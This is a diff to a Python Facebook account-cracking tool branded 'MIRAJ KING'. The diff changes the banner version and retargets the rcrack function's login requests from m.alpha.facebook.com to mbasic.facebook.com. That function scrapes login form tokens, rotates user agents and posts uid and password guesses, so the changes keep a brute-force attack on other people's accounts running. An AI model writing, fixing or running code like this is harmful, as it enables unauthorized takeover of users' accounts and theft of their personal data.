@@ -167,7 +167,7 @@ logo =("""
 \t\033[38;5;46m║\033[38;5;46m██  ██  ██ ██ ██   ██ ██   ██ ██   ██ \33[38;5;196m\033[34;1m\033[38;5;46m\033[38;5;46m✮⃝𝐊𝐈𝐍𝐆𝄟⃝
 \t\033[38;5;46m║\033[38;5;46m██      ██ ██ ██   ██ ██   ██  █████  \33[38;5;196m\033[34;1m\033[38;5;46m\33[38;5;196m✮⃝𝐊𝐈𝐍𝐆𝄟⃝
 \t\033[38;5;46m║\033[38;5;46m\33[38;5;196m\033[34;1m\033[38;5;46m\033[38;5;46m✮⃝𝐊𝐈𝐍𝐆𝄟⃝
-\t\033[38;5;46m║\033[38;5;46m\33[38;5;196mPOM💋POM\033[34;1mVERSION: VIP.6 \033[38;5;46m\33[38;5;196m✮⃝𝐊𝐈𝐍𝐆𝄟⃝
+\t\033[38;5;46m║\033[38;5;46m\33[38;5;196mPOM💋POM\033[34;1mVERSION: 0.10 \033[38;5;46m\33[38;5;196m✮⃝𝐊𝐈𝐍𝐆𝄟⃝
 \t\033[38;5;46m╚══════════════════════════════════╝
                \033[38;5;50m𝗗𝗔𝗧𝗔 & WIFI 𝗪𝗢𝗥𝗞𝗜𝗡𝗚 𝗧𝗢𝗢𝗟𝗦💥💥
 \33[38;5;196m     ┏━━━━━━━━━━━━━━━━━━━\033[38;5;46mMIRAJ KING\33[38;5;196m━━━━━━━━━━━━━━━━━━━━┓
@@ -252,7 +252,7 @@ def rcrack(uid,pwx,tl):
             sys.stdout.flush()
             pro = random.choice(ugen5)
             bi = random.choice([P,M,K,B,U,O,N,H])
-            free_fb = session.get('https://m.alpha.facebook.com').text
+            free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -263,7 +263,7 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'm.alpha.facebook.com',
+            header_freefb = {'authority': 'mbasic.facebook.com',
     'method': 'GET',
     'scheme':'https',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
